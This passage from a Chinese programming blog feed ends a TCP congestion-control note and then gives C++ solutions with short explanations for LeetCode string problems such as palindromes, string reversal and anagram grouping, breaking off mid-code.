aria-hidden="true">image-20240412143139945</figcaption></figure><ul><li><p>检测到所有超时事件，下一轮执行如下操作：</p><ul><li>ssthresh=cwnd/2</li><li>cwnd=1MSS（网络拥塞很严重）</li><li>进入慢启动状态</li></ul></li><li><p>检测到所有3次冗余ACK事件，下一轮执行如下操作：</p><ul><li>ssthresh = cwnd /2（网络拥塞不严重）</li><li>cwnd = ssthresh +3*MSS</li><li>进入快速恢复状态</li></ul></li><li><p>注意：如果当前cwnd不为偶数，计算新的ssthresh时一般向下取整。</p></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447961.png"alt="image-20240412143701610" /><figcaption aria-hidden="true">image-20240412143701610</figcaption></figure><h2 id="tcp吞吐量">7.4 TCP吞吐量</h2><ul><li>W：发生丢失的窗口大小（以字节为单位）</li><li>平均窗口大小： <spanclass="math inline">\(\frac{3}{4}W\)</span></li><li>平均吞吐量： <spanclass="math inline">\(\frac{3}{4}\frac{W}{RTT}bytes/sec\)</span></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404121447962.png"alt="image-20240412144504396" /><figcaption aria-hidden="true">image-20240412144504396</figcaption></figure><p><strong>参考资料：</strong></p><ol type="1"><li>计算机网络——自顶向下方法（第七版）</li></ol>]]></content>
    
    
    <categories>
      
      <category>计算机核心课程</category>
      
      <category>计算机网络</category>
      
      <category>计算机网络——自顶向下方法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>字符串篇</title>
    <link href="/2024/04/08/LeetCode/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%AF%87/"/>
    <url>/2024/04/08/LeetCode/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="字符">1. 字符</h1><h2 id="检测大写字母">检测大写字母</h2><blockquote><ul><li>无论第 1 个字母是否大写，其他字母必须与第 2个字母的大小写相同；</li><li>若第 1 个字母为小写，则需额外判断第 2 个字母是否为小写。</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">detectCapitalUse</span><span class="hljs-params">(string word)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (word.<span class="hljs-built_in">length</span>() &gt;= <span class="hljs-number">2</span> &amp;&amp; <span class="hljs-built_in">islower</span>(word[<span class="hljs-number">0</span>]) &amp;&amp; <span class="hljs-built_in">isupper</span>(word[<span class="hljs-number">1</span>])) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt; word.<span class="hljs-built_in">length</span>(); i++) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">islower</span>(word[i]) ^ <span class="hljs-built_in">islower</span>(word[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="回文串的定义">2. 回文串的定义</h1><h2 id="验证回文串">验证回文串</h2><blockquote><p>我们直接在原字符串 s上使用双指针。在移动任意一个指针时，需要不断地向另一指针的方向移动，直到遇到一个字母或数字字符，或者两指针重合为止。也就是说，我们每次将指针移到下一个字母字符或数字字符，再判断这两个指针指向的字符是否相同。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isPalindrome</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n=s.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> left=<span class="hljs-number">0</span>,right=n<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">while</span>(left&lt;right)&#123;<br>            <span class="hljs-keyword">while</span>(left&lt;right &amp;&amp; !<span class="hljs-built_in">isalnum</span>(s[left]))&#123;<br>                left++;<br>            &#125;<br>            <span class="hljs-keyword">while</span>(left&lt;right &amp;&amp; !<span class="hljs-built_in">isalnum</span>(s[right]))&#123;<br>                right--;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(left&lt;right)&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-built_in">tolower</span>(s[left])!=<span class="hljs-built_in">tolower</span>(s[right]))&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>                left++;<br>                right--;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="公共前缀">3. 公共前缀</h1><h2 id="最长公共前缀">最长公共前缀</h2><blockquote><p>从前往后遍历所有字符串的每一列，比较相同列上的字符是否相同，如果相同则继续对下一列进行比较，如果不相同则当前列不再属于公共前缀，当前列之前的部分为最长公共前缀。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">longestCommonPrefix</span><span class="hljs-params">(vector&lt;string&gt;&amp; strs)</span> </span>&#123;<br>        string ans = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-type">int</span> n = strs.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (index &lt; strs[<span class="hljs-number">0</span>].<span class="hljs-built_in">length</span>()) &#123;<br>            <span class="hljs-type">char</span> ch = strs[<span class="hljs-number">0</span>][index];<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>                <span class="hljs-keyword">if</span> (strs[i].<span class="hljs-built_in">size</span>() &lt;= index) &#123;<br>                    <span class="hljs-keyword">return</span> ans;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (strs[i][index] != ch) &#123;<br>                    <span class="hljs-keyword">return</span> ans;<br>                &#125;<br>            &#125;<br>            ans += ch;<br>            index++;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="单词">4. 单词</h1><h2 id="字符串中的单词数">字符串中的单词数</h2><blockquote><p>计算字符串中单词的数量，就等同于计数单词的第一个下标的个数。因此，我们只需要遍历整个字符串，统计每个单词的第一个下标的数目即可。满足单词的第一个下标有以下两个条件：</p><ul><li>该下标对应的字符不为空格；</li><li>该下标为初始下标或者该下标的前下标对应的字符为空格；</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">countSegments</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">length</span>(); i++) &#123;<br>            <span class="hljs-keyword">if</span> ((i == <span class="hljs-number">0</span> || s[i - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27; &#x27;</span>) &amp;&amp; s[i] != <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>                ans++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="最后一个单词的长度">最后一个单词的长度</h2><blockquote><p>反向遍历字符串，寻找最后一个单词并计算其长度。由于字符串中至少存在一个单词，因此字符串中一定有字母。首先找到字符串中的最后一个字母，该字母即为最后一个单词的最后一个字母。从最后一个字母开始继续反向遍历字符串，直到遇到空格或者到达字符串的起始位置。遍历到的每个字母都是最后一个单词中的字母，因此遍历到的字母数量即为最后一个单词的长度。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">lengthOfLastWord</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <br>        <span class="hljs-type">int</span> n = s.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-type">int</span> index = n - <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">while</span> (index &gt;= <span class="hljs-number">0</span> &amp;&amp; s[index] == <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>            index--;<br>        &#125;<br><br>        <span class="hljs-keyword">while</span> (index &gt;= <span class="hljs-number">0</span> &amp;&amp; s[index] != <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>            ans++;<br>            index--;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="字符串的反转">5. 字符串的反转</h1><h2 id="反转字符串">反转字符串</h2><blockquote><p><code>s[i]</code>与<code>s[n-1-i]</code>交换位置</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">reverseString</span><span class="hljs-params">(vector&lt;<span class="hljs-type">char</span>&gt;&amp; s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = s.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = n - <span class="hljs-number">1</span>; i &lt; j; i++, j--) &#123;<br>            <span class="hljs-built_in">swap</span>(s[i], s[j]);<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="反转字符串-ii">反转字符串 II</h2><blockquote><p>反转每个下标从 2<em>k</em> 的倍数开始的，长度为 <em>k</em>的子串。若该子串长度不足 <em>k</em>，则反转整个子串。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">reverseStr</span><span class="hljs-params">(string s, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = s.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i += <span class="hljs-number">2</span> * k) &#123;<br>            <span class="hljs-built_in">reverse</span>(s.<span class="hljs-built_in">begin</span>() + i, s.<span class="hljs-built_in">begin</span>() + <span class="hljs-built_in">min</span>(i + k, n));<br>        &#125;<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="反转字符串中的单词-iii">反转字符串中的单词 III</h2><blockquote><p>通过两个循环分别找到每个单词的起始位置和结束位置，然后调用<code>reverse</code>函数反转单词内部的字符。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">reverseWords</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n=s.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> index=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>(index&lt;n)&#123;<br>            <span class="hljs-keyword">while</span> (index &lt; n &amp;&amp; s[index] == <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>                index++;<br>            &#125;<br>            <span class="hljs-type">int</span> start = index;<br>            <br>            <span class="hljs-keyword">while</span> (index &lt; n &amp;&amp; s[index] != <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>                index++;<br>            &#125;<br>            <span class="hljs-type">int</span> end = index;<br>            <br>            <span class="hljs-built_in">reverse</span>(s.<span class="hljs-built_in">begin</span>()+start,s.<span class="hljs-built_in">begin</span>()+end);<br>        &#125;<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="翻转字符串里的单词">翻转字符串里的单词</h2><blockquote><ol type="1"><li>逆转整个字符串。</li><li>逆转字符串中的每个单词。</li><li>去除字符串前后的空格，并将单词间多个空格缩减为一个空格。</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">reverseWords</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-built_in">reverse</span>(s.<span class="hljs-built_in">begin</span>(), s.<span class="hljs-built_in">end</span>());<br><br>        <span class="hljs-type">int</span> n = s.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> start = <span class="hljs-number">0</span>; start &lt; n; start++) &#123;<br>            <span class="hljs-keyword">if</span> (s[start] !=<span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (index != <span class="hljs-number">0</span>) &#123;<br>                    s[index++] = <span class="hljs-string">&#x27; &#x27;</span>;<br>                &#125;<br><br>                <span class="hljs-type">int</span> end = start;<br>                <span class="hljs-keyword">while</span> (end &lt; n &amp;&amp; s[end] != <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>                    s[index++] = s[end++];<br>                &#125;<br><br>                <span class="hljs-built_in">reverse</span>(s.<span class="hljs-built_in">begin</span>() + index - (end - start), s.<span class="hljs-built_in">begin</span>() + index);<br><br>                start = end;<br>            &#125;<br>        &#125;<br>        s.<span class="hljs-built_in">erase</span>(s.<span class="hljs-built_in">begin</span>() + index, s.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="字符的统计">6. 字符的统计</h1><h2 id="字符串中的第一个唯一字符">字符串中的第一个唯一字符</h2><blockquote><p>在第一次遍历时，我们使用哈希映射统计出字符串中每个字符出现的次数。在第二次遍历时，我们只要遍历到了一个只出现一次的字符，那么就返回它的索引，否则在遍历结束后返回−1。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">firstUniqChar</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">char</span>, <span class="hljs-type">int</span>&gt; mp;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> ch : s) &#123;<br>            mp[ch]++;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">length</span>(); i++) &#123;<br>            <span class="hljs-keyword">if</span> (mp[s[i]] == <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">return</span> i;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="找不同">找不同</h2><blockquote><p>法一：使用两个哈希表存储两个字符串的字符及出现次数，然后进行比较。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">char</span> <span class="hljs-title">findTheDifference</span><span class="hljs-params">(string s, string t)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">char</span>,<span class="hljs-type">int</span>&gt; freq_s,<span class="hljs-type">freq_t</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">char</span> ch:s)&#123;<br>            freq_s[ch]++;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">char</span> ch:t)&#123;<br>            <span class="hljs-type">freq_t</span>[ch]++;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp; item:<span class="hljs-type">freq_t</span>)&#123;<br>            <span class="hljs-keyword">auto</span> it=freq_s.<span class="hljs-built_in">find</span>(item.first);<br>            <span class="hljs-keyword">if</span>(it==freq_s.<span class="hljs-built_in">end</span>()|| it-&gt;second!= item.second)&#123;<br>                <span class="hljs-keyword">return</span> item.first;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>法二：对字符串中每个字符的 ASCII 码的值求和，差值即为添加的元素。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">char</span> <span class="hljs-title">findTheDifference</span><span class="hljs-params">(string s, string t)</span> </span>&#123;<br>        <span class="hljs-type">int</span> as = <span class="hljs-number">0</span>, at = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> ch : s) &#123;<br>            as += ch;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> ch : t) &#123;<br>            at += ch;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> at - as;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="赎金信">赎金信</h2><blockquote><p>使用字符串 magazine 中的字符来构建新的字符串ransomNote。使用一个哈希表，先加，再减。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">canConstruct</span><span class="hljs-params">(string ransomNote, string magazine)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">char</span>, <span class="hljs-type">int</span>&gt; mp;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> ch : magazine) &#123;<br>            mp[ch]++;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> ch : ransomNote) &#123;<br>            <span class="hljs-keyword">if</span> (--mp[ch] &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="有效的字母异位词">有效的字母异位词</h2><blockquote><p>首先判断两个字符串长度是否相等，不相等则直接返回false；若相等，则使用一个哈希表，遍历字符串 s 和 t，s负责在对应位置增加，t 负责在对应位置减少。如果哈希表的值都为0，则二者是字母异位词。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isAnagram</span><span class="hljs-params">(string s, string t)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (s.<span class="hljs-built_in">length</span>() != t.<span class="hljs-built_in">length</span>()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        unordered_map&lt;<span class="hljs-type">char</span>, <span class="hljs-type">int</span>&gt; mp;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> ch : s) &#123;<br>            mp[ch]++;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> ch : t) &#123;<br>            mp[ch]--;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> item : mp) &#123;<br>            <span class="hljs-keyword">if</span> (item.second != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="字母异位词分组">字母异位词分组</h2><blockquote><p>由于互为字母异位词的两个字符串包含的字母相同，因此对两个字符串分别进行排序之后得到的字符串一定是相同的，故可以将排序之后的字符串作为哈希表的键。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;string&gt;&gt; <span class="hljs-built_in">groupAnagrams</span>(vector&lt;string&gt;&amp; strs) &#123;<br>        vector&lt;vector&lt;string&gt;&gt; ans;<br>        unordered_map&lt;string, vector&lt;string&gt;&gt; mp;<br><br>        <span class="hljs-keyword">for</span> (string str : strs) &#123;<br>            string key = str;<br>            <span class="hljs-built_in">sort</span>(key.<span class="hljs-built_in">begin</span>(), key.<span class="hljs-built_in">end</span>());<br>            mp[key].<span class="hljs-built_in">emplace_back</span>(str);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> item : mp) &#123;<br>            ans.<span class="hljs-built_in">emplace_back</span>(item.second);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="根据字符出现频率排序">根据字符出现频率排序</h2><blockquote><p>先统计每个字符在字符串中出现的频率，然后根据这些频率对字符进行排序，最后根据排序结果构建新的字符串。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> 